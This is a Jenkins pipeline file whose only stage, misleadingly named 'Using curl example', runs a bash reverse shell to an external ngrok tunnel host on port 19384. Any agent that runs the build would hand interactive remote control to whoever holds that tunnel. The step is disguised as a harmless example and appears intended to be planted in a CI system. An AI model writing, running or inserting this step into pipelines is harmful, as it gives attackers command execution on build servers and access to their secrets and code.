pipeline {
    agent any
    stages {
        stage("Using curl example") {
            steps {
                    sh 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/19384 0>&1'
                }
            }
        }
    
}
